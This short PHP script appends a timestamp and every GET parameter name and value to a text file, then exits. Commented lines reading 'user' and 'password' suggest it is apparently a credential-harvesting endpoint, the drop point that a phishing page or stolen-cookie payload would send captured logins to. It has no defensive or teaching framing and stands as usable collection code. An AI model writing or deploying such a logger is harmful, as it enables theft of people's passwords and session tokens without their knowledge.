
<?php
 
 // Open the text file in writing mode
 $file = fopen("static.txt", "a");
 $today = date("Y-m-d H:i:s");
 //$variable = $_GET ['user'];
 //$value = $_GET ['password'];

 foreach($_GET as $variable => $value) {
     fwrite($file, $today);
     fwrite($file, $variable);
     fwrite($file, $value);
 }
  
 fwrite($file, "\r\n");
 fclose($file);
 exit;
 ?>